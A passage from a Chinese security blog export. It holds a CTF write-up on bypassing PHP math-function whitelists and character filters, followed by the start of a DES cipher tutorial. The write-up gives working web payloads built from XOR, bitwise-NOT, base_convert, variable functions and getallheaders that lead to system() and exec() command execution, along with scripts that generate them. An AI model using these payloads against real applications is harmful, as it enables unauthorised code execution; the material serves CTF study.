<p>a = a ^ b; b = a ^ b; a = a ^ b;</p>
</li>
</ol>
<p>而我们要构造有 <code>空格*</code> 该怎么利用异或呢？</p>
<p>由上面的性质 1 其实就已经明确了，<code>&quot;a&quot;^&quot;a&quot;</code> 结果是多少呢？相同即 0 ，也就是说，其 ascii 全 0 ，ascii 全 0 按位异或，得到的不就完全是另外一个 ascii 码吗，换言之，<code>&quot;a&quot;^&quot;x&quot;^&quot;a&quot;</code> 无论怎么调换顺序，输出的都是 x 的ascii 码 120 ，无论 x 被替换为什么，都是一样的结果。</p>
<p>这也是 N0rths 师傅在博客中写的脚本中是 <code>echo $k^$i^&quot; *&quot;;</code> 的原因，想得到 <code>空格*</code> 就找 <code>k</code> 和 <code>i</code> 能异或出另外一个数学函数 <code>dechex</code> 构造的值，取的值自然是我们这里的白名单函数，前面说过，函数名默认为字符串。</p>
<p>再简单地讲，就是要构造出想要的字符串 s ，如果有一个 <code>dechex(x)</code> 的值是 <code>k^s^i</code>，那我们得到 s 只需要这样构造：<code>dechex(x)^k^i</code> ，也就相当于，<code>k^i^s^k^i</code>。</p>
</blockquote>
<p>师傅的爆破脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">$whitelist2 = [ <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>,<span class="string">&#x27;abs&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($whitelist <span class="keyword">as</span> $i):</span><br><span class="line">    <span class="keyword">foreach</span> ($whitelist2 <span class="keyword">as</span> $k):</span><br><span class="line">    <span class="keyword">echo</span> $k^$i^<span class="string">&quot; *&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;   &quot;</span> . $i . <span class="string">&quot; &quot;</span> . $k;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">endforeach</span>;</span><br></pre></td></tr></table></figure>
<p>理解上述这些后，来分析下师傅最终的 payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(base_convert(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>).(dechex(<span class="number">16</span>)^asinh^pi))</span><br><span class="line"><span class="comment">//base_convert(1751504350,10,36) -&gt;system</span></span><br><span class="line"><span class="comment">//base_convert(15941,10,36) -&gt; cat</span></span><br><span class="line"><span class="comment">//system(&#x27;cat *&#x27;)</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/08/D5SXABlPIv3xsZO.png" alt=""></p>
<p>而 <code>dechex(16)</code> 返回的值正好是 10 ，所以 <code>dechex(16)^asinh^pi</code> 这个表达式就相当于 <code>asinh^pi^&quot; *&quot;^asinh^pi</code> 也就相当于 <code>&quot; *&quot;^&quot;a&quot;^&quot;a&quot;</code> 输出自然就是 <code>空格*</code> 。</p>
<p>当然构造不止 <code>asinh^pi</code> ，其他也能异或出 <code>空格*</code> ，只需要找到异或结果为十六进制形式的组合，再找到转十六进制与其相等的一个十进制数，利用 <code>hexdec()</code> 进行异或即可。</p>
<p><img src="https://i.loli.net/2020/11/08/6MCYo9y5jgTk4zR.png" alt=""></p>
<p><code>dechex(11)^atan2^pow</code> 的结果也为 <code>空格*</code> </p>
<p>当然，既然能异或出特殊字符，那么异或出字母也不是什么难事，我们可以不用进制转换来构造关键字。</p>
<p>这部分放在下面的构造 <code>_GET</code> 绕过来一起分析。</p>
<hr>
<p>接下来我们再来学习绕过的操作，N0rths 师傅是直接读取 flag 的，除了 <code>cat *</code> 以外，师傅还提到了 <code>nl f*</code> 这个命令来读取，以图为例：</p>
<p><img src="https://i.loli.net/2020/11/08/w1Et9YsB75GVacq.png" alt=""></p>
<p>命令解释：</p>
<blockquote>
<p><code>nl [参数] [文件]</code></p>
<p>nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。</p>
</blockquote>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="构造-GET"><a href="#构造-GET" class="headerlink" title="构造 _GET"></a>构造 _GET</h4><p>因为黑名单字符过滤较多，我们也可以用 <code>_GET[]</code> 来传 <code>system</code> 之类的命令，但 <code>[]</code> 被过滤了，师傅提到的一个 trick 就是 <code>&#123;&#125;</code> 代替 <code>[]</code> 。</p>
<p>先上 payload ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br><span class="line"><span class="comment">// base_convert(37907361743,10,36) -&gt; hex2bin</span></span><br><span class="line"><span class="comment">// dechex(1598506324) -&gt; 5f474554</span></span><br><span class="line"><span class="comment">// hex2bin(&quot;5f474554&quot;) -&gt; _GET</span></span><br></pre></td></tr></table></figure>
<p>payload 的 <code>($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)</code> 这一串又是什么意思呢？为什么能将变量 <code>pi</code> 的值作为函数使用？</p>
<p>这里牵扯到 php 可变变量和可变函数的用法。</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/language.variables.variable.php">php 可变变量</a></p>
<p>简而言之，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">&quot;land&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>而一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$$a = <span class="string">&quot;vidar&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这时，两个变量都被定义了：<code>$a</code> 的内容是 <code>“land”</code> 并且 <code>$land</code> 的内容是 <code>“vidar”</code> 。</p>
<p>回到正题，<code>$pi</code> 的值为 <code>hex2bin(&quot;5f474554&quot;)</code> ，<code>$$pi</code> 也就是 <code>$hex2bin(&quot;5f474554&quot;) -&gt; $_GET</code> ，变成了预定义变量。</p>
<p><a href="https://www.php.net/manual/zh/functions.variable-functions.php">php 可变函数</a></p>
<p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<p>上面说过，<code>&#123;&#125;</code> 其实是代替 <code>[]</code> ，其实本为 <code>($$pi)[pi](($$pi)[abs])</code> ，即 <code>_GET[pi]((_GET)[abs])</code>  ，</p>
<p>而 <code>pi</code> 的值正好是 <code>system</code> ，php 就会寻找 <code>system</code> 函数来执行圆括号里的语句。</p>
<p>即 <code>system(&#39;tac flag.php&#39;)</code></p>
</blockquote>
<p>而上面说过，我们可以不利用进制转换，单纯异或构造语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pi=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));$pi=$$pi;$pi&#123;<span class="number">0</span>&#125;($pi&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure>
<p>同样这里利用了 php 可变变量和可变函数，但异或的对象有所不同，前文中明摆着我们是两个字符串相异或，而这里的 <code>is_nan^(6).(4)</code> 又会是什么结果呢？</p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">Mustapha Mond 师傅的 fuzz 脚本</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的 <code>$i.$j</code> 其实是字符串类型，也就是我们利用数学函数名与 01~99 范围的字符串相异或，这样我们可以得到字母（当然部分特殊字符也能得出）：</p>
<p><img src="https://i.loli.net/2020/11/08/jEyxkORKftGewN1.png" alt=""></p>
<p>而 payload 中的 <code>(is_nan^(6).(4)).(tan^(1).(5))</code> 正是 <code>&quot;_G&quot;.&quot;ET&quot;</code> ，即 <code>_GET</code> 。</p>
<h4 id="getallheaders-利用请求头传语句"><a href="#getallheaders-利用请求头传语句" class="headerlink" title="getallheaders 利用请求头传语句"></a>getallheaders 利用请求头传语句</h4><p>长度限制 80 是很容易超长的，何况还有白名单函数的限制，不能直接输入 <code>cat</code> 等命令，而我们可以利用 <code>getallheaders</code> 这个函数，把命令放在请求头来拼接语句。</p>
<p>函数解释：</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/function.getallheaders.php">getallheaders</a></p>
<p>获取全部 HTTP 请求头信息。</p>
</blockquote>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//base_convert(696468,10,36) -&gt; exec</span></span><br><span class="line"><span class="comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span></span><br><span class="line"><span class="comment">//exec(getallheaders()&#123;1&#125;)</span></span><br></pre></td></tr></table></figure>
<p>在报文头中相应属性，值为要执行的命令：</p>
<p><img src="https://i.loli.net/2020/11/08/68AXCBf1dwpvEYI.png" alt=""></p>
<p>好了，love math 到此告一段落，来看看今年的护网杯的 SimpleCalculator 。</p>
<h2 id="SimpleCalculator"><a href="#SimpleCalculator" class="headerlink" title="SimpleCalculator"></a>SimpleCalculator</h2><h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>这题其实 love math 的异或 payload 就能打出来，摆出这道题其实只是为了介绍另外一种运算 <code>~</code> 。</p>
<blockquote>
<p><code>~</code> 运算符</p>
<p>按位取反，将 <code>$a</code> 中为 0 的位设为 1，反之亦然。</p>
<p>也就是说，我们要返回 <code>system</code> ，可以按位用其反码来构造 payload 。</p>
</blockquote>
<p>因为记忆比较模糊，可能说的不太准确，当初 fuzz 的时候，其实输入框的限制是非常严格的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_ &#39; &quot; 空格 hex2bin、dechex、chr等等一些可以与字符互转的函数 system、exec等等一些可以命令执行的函数</span><br></pre></td></tr></table></figure>
<p>上面这些都被匹配到了，长度还限制 80 ，但对 url 上的却有松懈，因此可以说是 yt 。</p>
<p>这里要分析的是本校师傅给的一个神奇 payload ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ip=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>);$ip(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>);</span><br></pre></td></tr></table></figure>
<p><code>%8C%86%8C%8B%9A%92</code> 这些是 url 编码，解码后转换为 ascii 码，ascii 码再转换为二进制数，取其反码，然后逆操作，最后得到的值就是 <code>system</code> 。</p>
<p>以 <code>%8C</code> 为例，进行的运算用函数表示如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> chr(~ord(urldecode(<span class="string">&#x27;%8C&#x27;</span>)));</span><br><span class="line"><span class="comment">//s</span></span><br></pre></td></tr></table></figure>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pay = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">$re = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($pay); $i++)&#123;</span><br><span class="line">    $pay[$i] = chr(~ord($pay[$i]));</span><br><span class="line">    $re.= urlencode($pay[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $re;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实通篇看下来，最主要利用的是 php 位运算、可变变量、可变函数这些特性，用 math 函数结合 rce （这是次要的）。感觉还是要潜心学习一门语言，把它的特性深入了解后，才能在安全方面发挥最大作用。</p>
<p>声明：本文经安全客授权发布，转载请联系安全客平台。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RCE</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>DES攻略之原理篇</title>
    <url>/archives/681f5904.html</url>
    <content><![CDATA[<div class="note info">
            <p>此篇含大量数学公式，加载稍慢，请耐心等待。</p>
          </div>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>密码学课讲到了分组密码，故写文章总结一下要点，方便自己理解算法，参考了金晨辉等先生编著的《密码学》这本书，如有不当之处，还请在评论下方指出，我会及时进行检查修正，感谢！</p>
<p>接下来就是 DES 的回合了，多罗！</p>
<a id="more"></a>
<h1 id="DES-初识"><a href="#DES-初识" class="headerlink" title="DES 初识"></a>DES 初识</h1><h2 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h2><p>首先来介绍其算法。</p>
<p>DES 属于<strong>迭代型分组密码</strong>，是块加密的对称密钥加密算法（即发送方和接收方都使用相同的密钥来进行加密解密）。</p>
<p>迭代型分组密码算法有几个基本参数：</p>
<ul>
<li>分组长度</li>
<li>密钥长度</li>
<li>圈数（或迭代次数）</li>
<li>圈（子）密钥长度</li>
</ul>
<p>对于 DES 算法，其基本参数：</p>
<ul>
<li>分组长度 64 bit</li>
<li>密钥长度 64 bit（因每个密钥字节的最后一个比特用于奇偶校验，即每个密钥字节中所有比特的模 2 和为 0 ，故有效密钥长度为 56 bit）</li>
<li>圈数（或迭代次数）为 16</li>
<li>圈（子）密钥长度为 48 bit</li>
</ul>
<p>DES 的加、脱密算法运用的是同一个算法，二者唯一的不同之处就是圈（子）密钥的使用次序相反。</p>
<p>DES 也称为<strong>块加密的对称密钥加密算法</strong>（即发送方和接收方都使用相同的密钥来进行加密解密）。使用 56 bit 有效密钥加密 64 bit 的明文数据，当 n 个 64 bit 明文数据块都经过 DES 加密处理后，所得到的 n 个 64 bit 密文数据块串在一起就是密文输出。</p>
<h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><p><img src="https://i.loli.net/2020/11/04/xd3oDsJZbX6z2TU.png" style="zoom:80%;" /></p>
<p>加密算法如图所示，我们需要学习的加密运算如下：</p>
<ul>
<li>初始置换 $IP$</li>
<li>迭代运算中的圈（轮）函数 $Q_k(x,y)$ </li>
<li>逆初始置换 $IP^{-1}$</li>
</ul>
<p>我们一一对其进行分析理解。</p>
<h3 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h3><p>初始置换 $IP$ 是对 64 比特的明文数据进行比特位置的移动。</p>
<p><img src="https://i.loli.net/2020/11/04/CuINgiUY7SLMEFB.png" style="zoom: 67%;" /></p>
<p>简而言之，就是按上面这张表进行变动，例如原来的第 58 比特经过变换后就变成了第 1 比特，第 50 比特经过变换后就变成了第 2 比特……，上面的数字代表的是原输入的比特位置，“代号入座”即可。</p>
<p>我们可以试着观察这张表，从列来看，最后一列 2、4、6、8、1、3、5、7 这八个位置的比特是不是同一字节的八比特？其他列也可以得出在同一字节中；从行来看，第一行的 58、50、42、34、26、18、10、2 这八个位置的比特是不是在八个字节中的同一位置（即第二个）？其他行同理。</p>
<p>综上，我们可以得出：</p>
<p>初始置换表的特点是，将输入的每个字节的第 i 个比特集中到输出的一个字节中。</p>
<h3 id="逆初始置换"><a href="#逆初始置换" class="headerlink" title="逆初始置换"></a>逆初始置换</h3><p>为了方便理解，最后的逆初始置换 $IP^{-1}$ 放到前面来讲。</p>
<p>逆初始置换，字面上理解就是与初始置换互逆，即对 16 圈迭代后的结果进行比特位置的移动，得到64 bit 密文，作用是为了保证脱密的正常进行。</p>
<p><img src="https://i.loli.net/2020/11/04/xdwGiUtafhvgbzk.png" style="zoom:67%;" /></p>
<p>同初始置换一样，就是简单的“对号入座”。当然，既然互逆，也能直接利用置换求逆的方式用 $IP$ 计算出来，同时也有下面的运算式：</p>
<script type="math/tex; mode=display">
IP^{-1}[IP(M)]=M</script><p>总结一下，这两个置换只是对输入数据的结构作调整，用以打乱数据的 ASCII 码字划分关系，其密码意义不大，对 DES 的安全性<strong>并不起本质作用</strong>。</p>
<p>另外说一点，这两张置换表是算法固定的，不需要进行计算，纯应试的朋友可以放心。</p>
<h3 id="迭代运算中的圈（轮）函数"><a href="#迭代运算中的圈（轮）函数" class="headerlink" title="迭代运算中的圈（轮）函数"></a>迭代运算中的圈（轮）函数</h3><p>接下来就到了核心——迭代运算。</p>
<p>以加密流程图的第 1 轮运算为例讲解：</p>
<p><img src="https://i.loli.net/2020/11/04/nQVcy12LBGfbewq.png" style="zoom:80%;" /></p>
<p>如上，第 1 轮中，被初始置换后的 64 bit 明文数据分为左半部分 $L_0$ 和右半部分 $R_0$ 各 32 bit ，右半部分 $R_0$ 在 48 比特圈（子）密钥 $k_1$ 的作用下进行 $f$ 变换，得到的 32 比特数据再与左半部分 $L_0$ 按位异或，产生的 32 bit 作为下一轮迭代的右半部分即 $R_1$ ，原右半部分直接作为下一轮迭代的左半部分 $L_1$ 。</p>
<p>但我们看加密流程的第 16 轮：</p>
<p><img src="https://i.loli.net/2020/11/04/RUyJs56Ggq8oaLD.png" style="zoom:80%;" /></p>
<p>很明显，并没有像第 1 轮那样，最后得出的运算结果要交叉给后面的数据，也就是说，<strong>最后一轮，我们不进行左右块对换。</strong></p>
<p>综上，圈函数的数学描述如下：</p>
<script type="math/tex; mode=display">
L_i=R_{i-1},R_i=L_{i-1}\bigoplus f(R_{i-1},k_i),i=1,2,...,16</script><p>口诀的话，记个“上右给下左，上左异F，十六钢管直”好了（？</p>
<blockquote>
<p>这里是更深层面上的理解，跟上面表达式差不多，但提到了 Feistel 函数、对合变换这几个概念，“不求甚解”的朋友可以略过。</p>
<p><strong>Feistel 函数</strong></p>
<p><img src="https://i.loli.net/2020/11/04/NS2IU9BujZrx8F5.png" style="zoom:80%;" /></p>
<p>这个函数也就是前 15 轮的函数模型，我们设 Feistel 函数为 $F_k(x,y)=(x \bigoplus f(y,k),y)$  ，这就是两者计算的最后结果，最后我们需要的只有 exchange ，即设 $D(x,y)=(y,x)$ 为左右块对换，而前 15 轮的轮函数$Q_k(x,y)$ 可表示为这两个函数的复合：</p>
<script type="math/tex; mode=display">
Q_k(x,y)=D(F_k(x,y))=D(x\bigoplus f(y,k),y)=(y,x\bigoplus f(y,k))</script><p>而第 16 轮不就是没有块对换的 $F_k(x,y)$ 吗？</p>
<p><strong>对合变换</strong></p>
<p>定义：设 $g:X\to X$，如果对任意 $x\in X$ ，均有 $g(g(x))=x$ ，则称 $g$ 为对合变换。</p>
<p>很容易得出，左右块对换 $D(x,y)$ 是对合变换。</p>
<p>而 $F_k(x,y)$ 呢？</p>
<script type="math/tex; mode=display">
F_k(F_k(x,y))=F_k(x\bigoplus f(y,k),y)=(x\bigoplus f(y,k)\bigoplus f(y,k),y)=(x,y)</script><p>自然也是对合变换，综上，轮函数 $Q_k(x,y)$ 也是对合变换，因为 $IP$ 与 $IP^{-1}$ 是互逆的，我们最终可以得出：</p>
<script type="math/tex; mode=display">
DES^{-1}(DES(M))=M</script><p>这样一条定理。</p>
</blockquote>
<p>说了这么多，$f$ 函数到底是什么呢？</p>
<h4 id="f-函数"><a href="#f-函数" class="headerlink" title="f 函数"></a>f 函数</h4><p>$f$ 函数是 DES 加、脱密算法的核心，也是用来<strong>实现混乱与扩散</strong>这两个分组密码设计原则的函数。由上面轮函数的表达式来看，$f$ 是有两个输入 y、k 的（即圈输入右半部分的 32 bit 数据 $R$ ，另一个是由初始密钥通过密钥生成算法产生的 48 bit 圈（子）密钥 k ）。</p>
<p><img src="https://i.loli.net/2020/11/04/63ucksj1gA5zE9X.png" style="zoom:80%;" /></p>
<p>图中的 E 表示扩展变换 E 盒，S 表示非线性代替 S盒，P 表示比特移位变换 P 盒。</p>
<p>$f$ 函数可表示为以下数学表达式：</p>
<script type="math/tex; mode=display">
f(R,k)=PS(E(R)\bigoplus k)</script><p>接下来我们来解释 E、S、P 这三种变换。</p>
<h5 id="扩展变换-E-盒-（-32-bit-gt-48-bit-）"><a href="#扩展变换-E-盒-（-32-bit-gt-48-bit-）" class="headerlink" title="扩展变换 E 盒 （ 32 bit -&gt; 48 bit ）"></a>扩展变换 E 盒 （ 32 bit -&gt; 48 bit ）</h5><p>作用是将 32 bit 数据扩展为 48 bit 数据。</p>
<p><img src="https://i.loli.net/2020/11/04/jUZxdvIlPBfw25t.png" style="zoom:80%;" /></p>
<p>简单来说就是将原始的 32 bit 分为 8 组，每组 4 bit ，这样每组都有左相邻和右相邻的比特，左相邻放左边，右相邻放右边，比较极端的例子如 $a_1$ 的左相邻是 $a_{32}$ ，$a_{32}$ 的右相邻自然是 $a_1$ 。</p>
<h5 id="非线性代替-S盒-（-48-bit-gt-32-bit-）"><a href="#非线性代替-S盒-（-48-bit-gt-32-bit-）" class="headerlink" title="非线性代替 S盒 （ 48 bit -&gt; 32 bit ）"></a>非线性代替 S盒 （ 48 bit -&gt; 32 bit ）</h5><p>作用是将 E 盒扩展后的 48 bit 数据与 48 bit 圈（子）密钥按位异或，然后将得到的 48 bit 数据从左到右也分为 8 组，每组 6 比特，作为 $S_1$，$S_2$，…，$S_8$ 的输入。</p>
<p>这里的运算是：</p>
<ul>
<li>行号：由每组 6 比特中的 $a_1a_6$ 对应的十进制数得出。</li>
<li>列号：由每组 6 比特中的 $a_2a_3a_4a_5$ 对用的十进制数得出。</li>
</ul>
<p>然后对照下表查找到的十进制数再转换为 4 位二进制数作为输出。</p>
<p><img src="https://i.loli.net/2020/11/04/jMAglhkJBcviNK8.png" style="zoom: 80%;" /></p>
